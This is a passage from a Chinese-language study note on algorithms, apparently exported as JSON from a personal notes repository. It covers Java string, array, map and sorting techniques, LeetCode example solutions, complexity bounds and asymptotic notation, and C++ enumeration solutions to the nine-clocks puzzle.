频点：带宽的编号\n"
  },
  {
    "title": "./notes/基础知识/算法.md",
    "body": "![](https://raw.githubusercontent.com/NaisWang/images/master/20220604110723.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220604110827.png)\n\n# 算法入门\n## 算法的伪码编写\n### 分支语句\n```\nif a = b then\n  ...\nelse\n  ...\nend if\n```\n\n### 循环语句\n```\nwhile a != b do\n  ...\nend while\n\n\nfor i=1 to k do\n  ...\nend for\n```\n\n### 集合表示\n```\na = {v}\nb = a - {i};\nc = a + {i};\n```\n\n### 方法\n```\nfunction a(s, x)\n  ...\nend fun\n```\n\n## 命名习惯\n- `res`: 局部使用\n- `ans`: 全局使用\n- `r` : 行\n- `c` : 列\n- `nr` : 下一行\n- `nc` : 下一列\n- `cnt` : 计数\n\n## 算法常用技巧\n### 子序列、子数组、子串区别\n- 子序列 是不要求连续的\n- 子数组和子串一样，是需要连续的\n\n### 循环n次\n```java\nwhile (n-- != 0) {\n  ...\n}\n```\n\n### 字符串常用技巧\n#### 判断字符串中是否只有一种元素\n没有什么比较快捷的方式来判断字符串中是否只有一种元素。常用的是下面2中方法。\n\n字符串长度较少时：\n```java\nif (str[0] == str[1] && str[1] == str[2] && str[2] == str[3] ...) {\n  ...\n}\n```\n\n字符串长度较长时：\n```java\nfor (int i = 0; i < str.length() - 1; i++) {\n  if (str[i] != str[i + 1]) {\n    // 不只有一个元素\n  }\n}\n```\n\n##### 例题1: 字符串中最大的3位相同数字\n[字符串中最大的3位相同数字](https://leetcode.cn/problems/largest-3-same-digit-number-in-string/)\n\n此处判断子字符串是否由唯一一个数字组成的方式可以使用`if(str[0] == str[1] && str[1] == str[2])`来判断\n\n代码：\n```java\nclass Solution {\n  public String largestGoodInteger(String num) {\n    String ans = \"\";\n    for (int i = 0; i < num.length() - 2; i++) {\n      String sub = num.substring(i, i + 3);\n      char[] charArray = sub.toCharArray();\n      if (charArray[0] == charArray[1] && charArray[1] == charArray[2]) {\n        if (ans.equals(\"\") || Integer.parseInt(ans) < Integer.parseInt(sub)) {\n          ans = sub;\n        }\n      }\n    }\n    return ans;\n  }\n}\n```\n\n#### substring左闭右开\n```java\nString a = \"ab\";\n\n// substring为左闭右开\nSystem.out.println(a.substring(0, 1)); //输出a\nSystem.out.println(a.substring(0, 2)); //输出ab\n```\n\n#### 获取所有子串\n```java\n// 假设str的长度的为n，则时间复杂度为O(n^2); \nfor (int i = 0; i < str.length(); i++) {\n  for (int j = i + 1; j <= str.length(); j++) {\n    System.out.println(str.substring(i, j));\n  }\n}\n```\n\n#### 在字符串中间插入/删除字符串\n```java\n// 方式一\nString str = \"abcdefg\";\nstr = str.substring(0, 2) + \"123\" + str.substring(2);\nSystem.out.println(str); // 输出：ab123cdefg\nstr = str.substring(0, 2) + str.substring(5);\nSystem.out.println(str); // 输出：abcdefg\n\n// 方式二\nStringBuffer str = new StringBuffer(\"abcdefg\");\nstr.insert(2, \"123\"); \nSystem.out.println(str); // 输出：ab123cdefg\n// 左闭右开\nstr.delete(2, 5); \nSystem.out.println(str); // 输出：abcdefg\n```\n\n**当插入删除操作次数大时，方式一比方式二耗时地多**。例图下面例图，使用方式一会超时，而使用方式二不会\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220605143453.png)\n\n使用方式一的代码：\n```java\nclass TextEditor {\n  int cursorIndex = 0;\n  String str;\n\n  public TextEditor() {\n    str = \"\";\n  }\n\n  public void addText(String text) {\n    str = str.substring(0, cursorIndex) + text + str.substring(cursorIndex);\n    cursorIndex += text.length();\n  }\n\n  public int deleteText(int k) {\n    int temp = cursorIndex;\n    cursorIndex = cursorIndex - k < 0 ? 0 : cursorIndex - k;\n    str = str.substring(0, cursorIndex) + str.substring(temp);\n    return Math.min(k, temp);\n  }\n\n  public String cursorLeft(int k) {\n    cursorIndex -= k;\n    if (cursorIndex < 0) {\n      cursorIndex = 0;\n    }\n    int left = cursorIndex - 10 < 0 ? 0 : cursorIndex - 10;\n    return str.substring(left, cursorIndex);\n  }\n\n  public String cursorRight(int k) {\n    cursorIndex += k;\n    if (cursorIndex > str.length()) {\n      cursorIndex = str.length();\n    }\n    int left = cursorIndex - 10 < 0 ? 0 : cursorIndex - 10;\n    return str.substring(left, cursorIndex);\n  }\n}\n```\n上升代码会超时，此时只更改在字符串中间插入/删除字符串的操作为使用StringBuffer时，不会超时，代码如下：\n\n使用方式二：\n```java\nclass TextEditor {\n  int cursorIndex = 0;\n  StringBuffer str;\n\n  public TextEditor() {\n    str = new StringBuffer();\n  }\n\n  public void addText(String text) {\n    str.insert(cursorIndex, text);\n    cursorIndex += text.length();\n  }\n\n  public int deleteText(int k) {\n    int temp = cursorIndex;\n    cursorIndex = cursorIndex - k < 0 ? 0 : cursorIndex - k;\n    str.delete(cursorIndex, temp);\n    return Math.min(k, temp);\n  }\n\n  public String cursorLeft(int k) {\n    cursorIndex -= k;\n    if (cursorIndex < 0) {\n      cursorIndex = 0;\n    }\n    int left = cursorIndex - 10 < 0 ? 0 : cursorIndex - 10;\n    return str.substring(left, cursorIndex);\n  }\n\n  public String cursorRight(int k) {\n    cursorIndex += k;\n    if (cursorIndex > str.length()) {\n      cursorIndex = str.length();\n    }\n    int left = cursorIndex - 10 < 0 ? 0 : cursorIndex - 10;\n    return str.substring(left, cursorIndex);\n  }\n}\n```\n\n#### 反转字符串\n```java\nString reverse = new StringBuffer(string).reverse().toString();\n```\n\n### 字符常用操作\n#### 判断一个字符的大小写\n- `Character.isLowerCase(ch)` 方法用于判断指定字符ch是否为小写字母。\n- `Character.isUpperCase(ch)` 方法用于判断指定字符ch是否为大写字母。\n\n#### 字符大小写转换\n- `Character.toLowerCase(ch)` \n- `Character.toUpperCase(ch)` \n\n#### 依次遍历26个字符\n```java\nfor (char ch = 'a'; ch <= 'z'; ch++) {\n\n}\n```\n\n##### 例题1: 兼具大小写的最好英文字母\n[兼具大小写的最好英文字母](https://leetcode.cn/contest/weekly-contest-298/problems/greatest-english-letter-in-upper-and-lower-case/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220619212609.png)\n\n代码：\n```java\nclass Solution {\n    public String greatestLetter(String s) {\n      char[] charArray = s.toCharArray();\n      Set<Character> set = new HashSet();\n      for (int i = 0; i < charArray.length; i++) {\n        set.add(charArray[i]);\n      }\n      for (char ch = 'Z'; ch >= 'A'; ch--) {\n        if (set.contains(ch) && set.contains(Character.toLowerCase(ch))) {\n          return ch + \"\";\n        }\n      }\n      return \"\";\n    }\n}\n```\n\n### 数字数组常用技巧\n#### 多个数字数组判重\n假设给你多个数字数组，让你判重。此时有多个方法可以实现，比较常见的是使用`Set<String>`类型。将数字数组转换成能唯一标识的字符串存入`Set<String>`中。\n\n例如现在有`[2, 3]`, `[2, 12]`, `[2, 3]`, `[2, 1, 2]`, `[2]`数组。将这些数组转换能唯一标识的字符串的方式主要如下2种方式：\n\n方式一：使用数组的`toString()`方法, 例如上述数组分别可以转换成`\"[2, 3]\"`, `\"[2, 12]\"`, `\"[2, 3]\"`, `\"[2, 1, 2]\"`, `\"[2]\"`\n\n方式二：循环遍历每个元素，在元素后加逗号`,`，然后将其拼接。例如上述数组分别可以转换成`\"2,3\"`, `\"2,12\"`, `\"2,3\"`, `\"2,1,2\"`, `\"2\"`\n\n#### 例题1: 含最多 K 个可整除元素的子数组\n[含最多 K 个可整除元素的子数组](https://leetcode.cn/problems/k-divisible-elements-subarrays/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220606223706.png)\n\n\n##### 分析\n分析1: 由于子数组是连续的，所以穷举所有子数组的时间复杂度为O(n^2)，其中n为原数组的长度。这题中的原数组的长度为`1 <= nums.length <= 200`，显然可以使用O(n^2)的时间复杂度来穷举所有子数组\n\n分析2: 由于需要对数组进行去重，所以可以使用`Set<String>`\n\n代码:\n```java\npublic int countDistinct(int[] nums, int k, int p) {\n  Set<String> set = new HashSet<>();\n  for (int i = 0; i < nums.length; i++) {\n    int cnt = 0;\n    StringBuffer sb = new StringBuffer();\n    for (int j = i; j < nums.length; j++) {\n      sb.append(nums[j] + \",\");\n      if (nums[j] % p == 0) {\n        cnt++;\n      }\n      if (cnt > k) {\n        break;\n      }\n      if (!set.contains(sb)) {\n        set.add(sb.toString());\n      }\n    }\n  }\n  return set.size();\n}\n```\n\n#### java中判断2个数组的内容是否相等\n使用`Arrays.equals(a, b)`方法\n```java\nint[] a = {1, 2, 3};\nint[] b = {1, 2, 3};\nSystem.out.println(Arrays.equals(a, b));\n```\n\n#### 基本类型数组自定义排序\n不能使用`Arrays.sort()`方法来对基本类型数组自定义排序，因为Arrays类的自定义排序方法的参数如下：\n```java\npublic static <T> void sort(T[] a, Comparator<? super T> c) {\n  ...\n}\n```\n是一个泛型方法，接受`T[]`类型，所以方法无法处理`int`类型数组。如果想要对`int`数组进行自定义排序，可以先将int[]转换为Integer类型数组，再使用Arrays.sort来自定义排序，自定义排序后再将Intege类型数组转换为int类型数组，方法如下：\n```java\nint[] nums = {3, 1, 2, 3};\nInteger[] numsIn = Arrays.stream(nums).boxed().toArray(Integer[]::new);\nArrays.sort(numsIn, (a, b) -> {\n    ...\n});\nnums = Arrays.stream(numsIn).mapToInt(p -> p).toArray();\n```\n以上步骤可以简便写成如下形式：\n```java\nint[] nums = {3, 1, 2, 3};\nnums = Arrays.stream(nums).boxed().sorted((a, b) -> {\n  ...\n}).mapToInt(p -> p).toArray();\n```\n\n##### 逆序排序数组\n```java\nInteger[] a = {10, 23, 42, 12, 20, 6};\nArrays.sort(a, Collections.reverseOrder());\n```\n注意：此方法不适用于`int[]`。对于`int[]`, 没有很简洁的方法来实现逆序排序，比较简洁的方式如下：\n```java\nnums = Arrays.stream(nums).boxed().sorted((a, b) -> b - a).mapToInt(p -> p).toArray();\n```\n\n#### Stream流求数组和\n```java\n// 基本数组\nint[] a = new int[]{2,3,5};\nlong[] b = new long[]{2,3,5};\nSystem.out.println(Arrays.stream(a).sum());\nSystem.out.println(Arrays.stream(b).sum());\n\n// 引用类型数组\nInteger[] a = new Integer[]{2,3,5};\nSystem.out.println(Arrays.stream(a).mapToInt(Integer::intValue).sum());\n```\n\n#### 找出数组中最值\n使用`int res = Arrays.stream(nums).max().getAsInt()`方法\n```java\nint[] nums = {1,2,3,2};\nint res = Arrays.stream(nums).max().getAsInt();\nSystem.out.println(res); // 3\nSystem.out.println(Arrays.toString(nums)); // [1, 2, 3, 2]\n```\n\n#### 判断某个所在行与列是否相等\n```java\nint[][] nums = {{3,1,2,2},{1,4,4,5},{2,4,2,2},{2,4,2,2}};\n\n// 如何判断坐标(2, 3)所在的行与列是否相等。\nfor (int i = 0; i < 4; i++) {\n  if (nums[2][j] != nums[i][3]) {\n    // 不相等\n    return false;\n  }\n}\n// 相等\nreturn true;\n```\n\n##### 例题1：相等行列对\n[相等行列对](https://leetcode.cn/contest/weekly-contest-303/problems/first-letter-to-appear-twice/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724152035.png)\n\n代码：\n```java\nclass Solution {\n  public int equalPairs(int[][] grid) {\n    int res = 0;\n    for (int i = 0; i < grid.length; i++) {\n      for (int j = 0; j < grid.length; j++) {\n        boolean flag = true;\n        for (int z = 0; z < grid.length; z++) {\n          if (grid[i][z] != grid[z][j]) {\n            flag = false;\n            break;\n          }\n        }\n        if (flag) {\n          res++;\n        }\n      }\n    }\n    return res;\n  }\n}\n```\n\n### 区间常用技巧\n#### 获取区间的mid\n获取[left, right]区间的mid下标\n```java\n// 方式一\nint mid = (left + right) / 2;\n\n// 方式二: 可以防止数据溢出\nint mid = left + (right - left) / 2;\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220605135921.png)\n\n### 循环结构的写法技巧\n所有循环结构中的代码部分可以分为2种：\n- 第一部分：为当前循环作**处理**的代码\n- 第二部分：为下一次循环作**准备**的代码, 即此处代码对当前循环没有任何帮助，都是在为下一次循环作准备\n\n#### 例题1: 螺旋矩阵 IV\n[螺旋矩阵 IV](https://leetcode.cn/problems/spiral-matrix-iv/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220713221751.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/Screen11.jpg)\n\n### 对Map中key的值重新计算的写法技巧\n需求：对Map中指定key对应的value值进行重新计算，如果不存在这个key，则添加到Map中。\n实现：常用的写法技巧可以分为如下2种\n- Map中的value为基本类型: `map.put(key, map.getOrDefault(key, 0) + 1)`\n- Map中的value为引用类型: `map.computeIfAbsent`\n\n#### Map中的value为基本类型\n使用`map.put(num, map.getOrDefault(num, 0) + 1)`方法。例如统计某个元素出现的次数可以使用`map.put(num, map.getOrDefault(num, 0) + 1)`\n```java\nMap<Integer, Integer> map = new HashMap<>();\nfor (int num : nums) {\n  map.put(num, map.getOrDefault(num, 0) + 1);\n}\n```\n\n##### 例题1: 数组能形成多少数对\n[数组能形成多少数对](https://leetcode.cn/contest/weekly-contest-302/problems/maximum-number-of-pairs-in-array/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220717135410.png)\n\n代码：\n```java\nclass Solution {\n    public int[] numberOfPairs(int[] nums) {\n      Map<Integer, Integer> map = new HashMap<>();\n      for (int num : nums) {\n        map.put(num, map.getOrDefault(num, 0) + 1);\n      }\n      int[] res = new int[2];\n      for (Integer value : map.values()) {\n        res[0] += value / 2; \n        res[1] += value % 2; \n      }\n      return res;\n\n    }\n}\n```\n\n#### Map中的value为引用类型\n使用`map.computeIfAbsent`方法，具体该方法的使用，可参考：https://www.runoob.com/java/java-hashmap-computeifabsent.html\n\n##### 例题1: 数位和相等数对的最大和\n[数位和相等数对的最大和](https://leetcode.cn/contest/weekly-contest-302/problems/max-sum-of-a-pair-with-equal-sum-of-digits/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220717154617.png)\n\n代码：\n```java\nclass Solution {\n      public int maximumSum(int[] nums) {\n      Map<Integer, List<Integer>> map = new HashMap<>();\n      for (int num : nums) {\n        map.computeIfAbsent(getSum(num), a -> new ArrayList<>()).add(num);\n      }\n      int res = -1;\n      for (List<Integer> value : map.values()) {\n        if (value.size() < 2) continue;\n        value.sort(Collections.reverseOrder());\n        res = Math.max(res, value.get(0) + value.get(1));\n      }\n      return res;\n    }\n\n    int getSum(int num) {\n      int res = 0;\n      while (num != 0) {\n        res += num % 10;\n        num = num / 10;\n      }\n      return res;\n    }\n\n}\n```\n\n### 模拟C++中的Pair\npair是将2个数据组合成一组数据，当需要这样的需求时就可以使用pair，如stl中的map就是将key和value放在一起来保存。另一个应用是，当一个函数需要返回2个数据的时候，可以选择pair。\n\n在java中可以使用`Map.Entry`来实现Pair效果。例如在实现保留原本的下标进行排序的方法中就使用到了`Map.Entry`\n\n### 保留原本的下标进行排序\n#### 方式一：另开数组存储下标\n```java\nint[] nums = {1, 3, 2, 4, 2, 5};\nInteger[] index = new Integer[nums.length];\nfor (int j = 0; j < index.length; j++) {\n  index[j] = j;\n}\nArrays.sort(index, (a, b) -> {\n  return nums[a] - nums[b];\n});\n```\n\n#### 方式二：使用Map.Entry\n```java\nint[] nums = {1, 3, 2, 4, 2, 5};\nMap.Entry<Integer, Integer>[] items = new Map.Entry[nums.length];\nfor (int j = 0; j < nums.length; j++) {\n  items[j] = Map.entry(j, nums[j]);\n}\nArrays.sort(items, (a, b) -> {\n  return a.getValue() - b.getValue();\n});\nSystem.out.println(Arrays.toString(items)); // 输出：[0=1, 2=2, 4=2, 1=3, 3=4, 5=5]\n```\n\n#### 例题1: 裁剪数字后查询第 K 小的数字\n[裁剪数字后查询第 K 小的数字](https://leetcode.cn/contest/weekly-contest-302/problems/query-kth-smallest-trimmed-number/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220717164034.png)\n\n方式一：另开数组存储下标\n```java\nclass Solution {\n    public int[] smallestTrimmedNumbers(String[] nums, int[][] queries) {\n      int[] res = new int[queries.length];\n      for (int i = 0; i < queries.length; i++) {\n        int[] query = queries[i];\n        int k = nums[0].length() - query[1];\n        Integer[] index = new Integer[nums.length];\n        for (int j = 0; j < index.length; j++) {\n          index[j] = j;\n        }\n        Arrays.sort(index, (a, b) -> {\n          return nums[a].substring(k).compareTo(nums[b].substring(k));\n        });\n        res[i] = index[query[0] - 1];\n      }\n      return res;\n    }\n}\n```\n\n方式二：使用`Map.Entry`\n```java\nclass Solution {\n    public int[] smallestTrimmedNumbers(String[] nums, int[][] queries) {\n      int[] res = new int[queries.length];\n      for (int i = 0; i < queries.length; i++) {\n        int[] query = queries[i];\n        int k = nums[0].length() - query[1];\n        Map.Entry<Integer, String>[] items = new Map.Entry[nums.length];\n        for (int j = 0; j < nums.length; j++) {\n          items[j] = Map.entry(j, nums[j].substring(k)); \n        }\n        Arrays.sort(items, (a, b) -> {\n          return a.getValue().compareTo(b.getValue());\n        });\n        res[i] = items[query[0] - 1].getKey();\n      }\n      return res;\n    }\n}\n```\n\n\n## 时间复杂度与数据范围\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220414115008.png)\n\n在竞赛中，一般认为计算机一秒能执行$5 ×10^8$次计算，如果题目给出的时间限制为1秒，那么选择的算法执行的计算次数最多应该在$10^8$量级才有可能解决这个题目。\n一般情况下：\n- $O(n)$的算法能解决的数据范围在 $n≤10^8$\n- $O(nlogn)$ 的算法能解决的数据范围在 $n≤10^6$\n- $O(n\\sqrt{n})$ 的算法能解决的数据范围在 $n≤10^5$\n- $O(n^2)$ 的算法能解决的数据范围在 $n≤5000$; $5000^2 = 25000000 ≈ 3 * 10^8 $\n- $O(n^3)$ 的算法能解决的数据范围在 $n≤300$; $300^3 = 27000000 ≈ 3 * 10^8 $\n- $O(2^n)$ 的算法能解决的数据范围在 $n≤25$; $2^25 = 33554432 ≈ 3 * 10^8$$\n- $O(n!)$ 的算法能解决的数据范围在 $n≤11$; $11! = 39916800 ≈ 4 * 10^8$\n\n以上范围仅供参考，实际过程中还要考虑每种算法的常数。\n\n\n### 渐渐符号\n\n#### Θ符号\n$$Θ(g(n)) = {f(n):存在正常量c_1, c_2, 和n_0，使得对所有n \\geq n_0, 有0 \\leq c_1g(n) \\leq f(n) \\leq c_2g(n)}$$\n\n若存在正常量$c_1和c_2$，使得对于足够大的n，函数f(n)能“夹入”$c_1g(n)与c_2g(n)$之间，则f(n)属于集合Θ(g(n))。因为Θ(g(n))是一个集合，所以可以记“$f(n) \\in Θ(g(n))$”，以指出f(n)是Θ(g(n))的成员。作为替代，我们通常记“f(n) = Θ(g(n))”以表达相同的概念。\n\n#### O符号\n$$O(g(n)) = {f(n):存在正常量c, 和n_0，使得对所有n \\geq n_0, 有0 \\leq f(n) \\leq cg(n)}$$\n\n#### Ω符号\n$$Ω(g(n)) = {f(n):存在正常量c, 和n_0，使得对所有n \\geq n_0, 有0 \\leq cg(n) \\leq f(n)}$$\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220119104219.png)\n\n#### o符号\n由于O符号提供的渐进上界可能是也可能不是渐近紧确的。界$2n^2=O(n^2)$是渐近紧确的,但是$2n=O(n^2)$却不是。我们使用o符号来表示一个非渐近紧确的上界。\n\n$$o(g(n)) = {f(n):对任意正常量c, 和n_0，使得对所有n \\geq n_0, 有0 \\leq f(n) < cg(n)}$$\n\n例如：$2n=o(n^2), 但是2n^2 \\not= o(n^2)$\n\n#### ω符号\nω符号与Ω符号的关系类似于o符号与O符号的关系。我们使用ω符号来表示一个非渐近紧确的下界。\n\n$$ω(g(n)) = {f(n):对任意正常量c, 和n_0，使得对所有n \\geq n_0, 有0 \\leq cg(n) < f(n)}\\\\\\$$\n\n### 主方法\n\n<div class=\"container\">\n  <iframe src=\"https://docs.google.com/document/d/e/2PACX-1vROjB7rSJrDTeE8SPvqcjH0x7q0Z0NOSDotAduN8ihLBAUVaGdacHq-Z9ToHB4HQLOpgSzTPq0ITzeW/pub?embedded=true\"></iframe>\n</div>\n\n## 回溯、分治、递归区别\n### 递归\n递归就是自我调用，经常作为一种编程的实现方式，比如动态规划、回溯法、分治法都可以用递归来实现，当然也可以用非递归来实现。\n\n### 分治算法\n#### 基本思想\n分治法的设计思想是： 将一个难以直接解决的大问题，分割成一些规模较小的**相同**问题，以便各个击破，分而治之 。\n\n在计算机科学中，分治法是一种很重要的算法。字面上的解释是“分而治之”，就是 把一个复杂的问题分成两个或更多的相同或相似的子问题，再把子问题分成更小的子问题……直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并 。这个技巧是很多高效算法的基础，如排序算法(快速排序，归并排序)，傅立叶变换(快速傅立叶变换)……\n\n任何一个可以用计算机求解的问题所需的计算时间都与其规模有关。问题的规模越小，越容易直接求解，解题所需的计算时间也越少。例如，对于n个元素的排序问题，当n=1时，不需任何计算。n=2时，只要作一次比较即可排好序。n=3时只要作3次比较即可，…。而当n较大时，问题就不那么容易处理了。要想直接解决一个规模较大的问题，有时是相当困难的。\n\n#### 分治法的基本步骤\n分治法在每一层递归上都有三个步骤：\n- step1 分解：将原问题分解为若干个规模较小, 与原问题形式相同的子问题；\n- step2 解决：若子问题规模较小而容易被解决则直接解，否则递归地解各个子问题\n- step3 合并：将各个子问题的解合并为原问题的解。\n\n#### 使用分治法的经典案例\n- 二分查找\n- 归并排序\n- 快速排序\n\n> 注意：如果用递归来现实分治法，则递归树上父节点的问题规模一定是要大于子节点的问题规模i的\n\n### 回溯法\n回溯是一种通用的算法，把问题分步解决，在每一步都试验所有的可能，当发现已经找到一种方式或者目前这种方式不可能是结果的时候，退回上一步继续尝试其他可能。很多时候每一步的处理都是一致的，这时候用递归来实现就很自然。回溯有点类似于穷举，但是和穷举不同的是回溯会“剪枝”。\n\n#### 使用回溯法的经典案例\n- DFS\n- 全排列\n\n## 隐式图上的DFS算法与分治法中的DFS的区别\n隐式图上的DFS算法适用的问题：\n- 隐式图上的DFS算法可以用来**模拟一个状态到达目标状态的过程**。\n- 状态与状态之间的关系是呈**图形**的\n\n分治法中的DFS适用的问题\n- 分治法中的DFS是用来实现分治法的\n- 状态与状态之间的关系是呈**树形**的\n\n## 枚举\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/14BqjQi3YcamJgb1tzUMgj7Ltvv9lKpA4/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n### OpenJudge-NOI/2.1基本算法之枚举-1816：拨钟问题\n总时间限制: 1000ms 内存限制: 65536kB\n\n描述\n\n有9个时钟，排成一个`3*3`的矩阵。\n```\n|-------|    |-------|    |-------|\n|       |    |       |    |   |   |\n|---O   |    |---O   |    |   O   |\n|       |    |       |    |       |\n|-------|    |-------|    |-------|\n    A            B            C    \n\n|-------|    |-------|    |-------|\n|       |    |       |    |       |\n|   O   |    |   O   |    |   O   |\n|   |   |    |   |   |    |   |   |\n|-------|    |-------|    |-------|\n    D            E            F    \n\n|-------|    |-------|    |-------|\n|       |    |       |    |       |\n|   O   |    |   O---|    |   O   |\n|   |   |    |       |    |   |   |\n|-------|    |-------|    |-------|\n    G            H            I    \n```\n              (图 1)\n现在需要用最少的移动，将9个时钟的指针都拨到12点的位置。共允许有9种不同的移动。如下表所示，每个移动会将若干个时钟的指针沿顺时针方向拨动90度。\n```\n移动    影响的时钟\n\n 1         ABDE\n 2         ABC\n 3         BCEF\n 4         ADG\n 5         BDEFH\n 6         CFI\n 7         DEGH\n 8         GHI\n 9         EFHI    \n```\n输入\n\n9个整数，表示各时钟指针的起始位置，相邻两个整数之间用单个空格隔开。其中，0=12点、1=3点、2=6点、3=9点。\n\n输出\n\n输出一个最短的移动序列，使得9个时钟的指针都指向12点。按照移动的序号从小到大输出结果。相邻两个整数之间用单个空格隔开。\n\n样例输入\n```\n3 3 0 \n2 2 2 \n2 1 2 \n```\n样例输出\n\n```\n4 5 8 9\n```\n\n#### 题解\n由题可知，一共有9种不同的移动，那么我们将每一种移动对应于一种操作(operation),简写成op。每种操作都会影响若干个时钟，那么我们将每种操作影响的时钟转换为每个时钟受哪些操作的影响。如下所示：\n```\nA 1 2 4\nB 1 2 3 5\nC 2 3 6\nD 1 4 5 7\nE 1 3 5 7 9\nF 3 5 6 9\nG 4 7 8\nH 5 7 8 9\nI 6 8 9\n```\n又因为每次操作会将若干个时钟转动90度，所以当同一个操作进行4次，其实就是旋转了360度，相当于没有操作。(**一种操作做四次和不做是一样的**)所以每种操作做的次数为：0，1，2，3。一共有9种操作，所以枚举次数为4的9次方，暴力枚举就是一个9重循环。最后用一个变量sum来累加每个时钟被操作后的指向，如果累加完后sum=0，那么说明找到了一个移动序列使得9个时钟的指针都指向12点。但此时我们并不知道找到的是否就是最短的序列，所以还要进行比较取操作次数的最小值。\n\n##### 方法一 暴力枚举\n代码如下：\n```cpp\n#include<iostream>\nusing namespace std;\nint ori[10];\nint op[10];\nint result[10];\nint main()\n{\n    int sum,min=28,moves;\n    for(int i=1; i<10; ++i)\n      cin >> ori[i];\n    for(op[1]=0; op[1]<4; ++op[1])\n      for(op[2]=0; op[2]<4; ++op[2])\n        for(op[3]=0; op[3]<4; ++op[3])\n          for(op[4]=0; op[4]<4; ++op[4])\n            for(op[5]=0; op[5]<4; ++op[5])\n              for(op[6]=0; op[6]<4; ++op[6])\n                for(op[7]=0; op[7]<4; ++op[7])\n                  for(op[8]=0; op[8]<4; ++op[8])\n                    for(op[9]=0; op[9]<4; ++op[9])\n                    {\n                        sum=0;\n                        sum+=(ori[1]+op[1]+op[2]+op[4])%4;\n                        sum+=(ori[2]+op[1]+op[2]+op[3]+op[5])%4;\n                        sum+=(ori[3]+op[2]+op[3]+op[6])%4;\n                        sum+=(ori[4]+op[1]+op[4]+op[5]+op[7])%4;\n                        sum+=(ori[5]+op[1]+op[3]+op[5]+op[7]+op[9])%4;\n                        sum+=(ori[6]+op[3]+op[5]+op[6]+op[9])%4;\n                        sum+=(ori[7]+op[4]+op[7]+op[8])%4;\n                        sum+=(ori[8]+op[5]+op[7]+op[8]+op[9])%4;\n                        sum+=(ori[9]+op[6]+op[8]+op[9])%4;\n                        if(sum==0)\n                        {   \n                            moves=0;\n                            for(int i=1; i<10; ++i)\n                                moves+=op[i];\n                            if(moves<min)\n                            {\n                                min=moves;\n                                for(int i=1; i<10; ++i)\n                                    result[i]=op[i];\n                            }   \n                        }\n                    }\n    for(int i=1; i<10; ++i)\n    {\n        while(result[i]--)\n        {\n            cout << i << \" \";\n        }\n    }\n    return 0;\n}\n```\n\n枚举的核心问题就是：\n1. 怎样去枚举？\n2. 在答案正确的情况下，怎么减少枚举次数？\n\n所以这道题怎么减少枚举次数呢？\n\n枚举中有一个十分重要的思想—<font color=\"red\">局部思想法</font>，它的基本思路如下：\n\n所以我们来看这道题，看能不能找到一个局部使得枚举的次数减少。不难发现操作1，2，3为一个局部。例如，当我们确定了操作1，2，3的次数以后，得到A,B,C这三个时钟的指针的指向，此时只有操作4能够改变A时钟的的指针方向，使它能指向12点。同理，只有操作5才能够改变B时钟的指针方向，只有操作6才能够改变C时钟的指针方向。那么操作4-6的次数也就确定了。同样，继续往下，现在操作1-6的次数都确定了，只有操作7才能改变D时钟的指针方向，只有操作8才能改变G时钟的指针方向,只有操作9才能改变F时钟的指针方向。\n\n这样操作1-9的次数都被确定了，A,B,C,D,G,F这6个时钟的指针都指向了12点，只有E,H,I这三个时钟指针方向还没有确定。所以剩下只用判断E,H,I这三个时钟的指针指向12点没有，如果都指向了12点，那说明找到了一个序列使得9个时钟的指针都指向了12点。\n\n所以根据局部思想的方法，我们只需对操作1，2，3进行枚举，枚举的次数为4的3次方=64次。\n\n##### 方法二 局部枚举\n代码如下：\n```cpp\n#include<iostream>\nusing namespace std;\nint ori[10];\nint op[10];\nint result[10];\nint main()\n{\n    int min=28,moves,e,h,i;\n    for(int i=1; i<10; ++i)\n      cin >> ori[i];\n    for(op[1]=0; op[1]<4; ++op[1])\n      for(op[2]=0; op[2]<4; ++op[2])\n        for(op[3]=0; op[3]<4; ++op[3])\n        {\n            op[4]=(4-(ori[1]+op[1]+op[2])%4)%4;//确定A\n            op[5]=(4-(ori[2]+op[1]+op[2]+op[3])%4)%4;//确定B\n            op[6]=(4-(ori[3]+op[2]+op[3])%4)%4;//确定C\n            op[7]=(4-(ori[4]+op[1]+op[4]+op[5])%4)%4;//确定D\n            op[8]=(4-(ori[7]+op[4]+op[7])%4)%4;//确定G\n            op[9]=(4-(ori[6]+op[3]+op[5]+op[6])%4)%4;//确定F\n            e=(ori[5]+op[1]+op[3]+op[5]+op[7]+op[9])%4;\n            h=(ori[8]+op[5]+op[7]+op[8]+op[9])%4;\n            i=(ori[9]+op[6]+op[8]+op[9])%4;\n            if((e+h+i)==0)//判断E,H,I这三个时钟指针都指向12点没有\n            {\n                moves=0;\n                for(int i=1; i<10; ++i)\n                    moves+=op[i];\n                if(moves<min)\n                {\n                    min=moves;\n                    for(int i=1; i<10; ++i)\n                        result[i]=op[i];\n                }       \n            }\n        }\n    for(int i=1; i<10; ++i)\n    {\n        while(result[i]--)\n        {\n            cout << i << \" \";\n        }\n    }\n    return 0;               \n}\n```\n\n### 枚举总结\n#### 枚举流程图\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220515194653.png)\n\n#### 枚举遍历方法\n枚举**由n个节点状态组合搭配而成的集合**，常见有如下4种方法：\n- 使用for循环\n- 使用进位\n- 使用dfs\n\n例如：现在有3个节点，分别是A、B、C。这三个节点都有4个状态，分别是0、1、2、3。现在需要枚举由这3个节点状态组合搭配而成的集合{(i, j, z) | i, j, z∈(0, 1, 2, 3) }。\n\n##### 使用for循环\n```java\nfor (int i = 0; i < 4; i++) {\n  for (int j = 0; j < 4; j++) {\n    for (int z = 0; z < 4; z++) {\n      System.out.println(i + \",\" + j + \",\" + z);\n    }\n  }\n}\n```\n\n##### 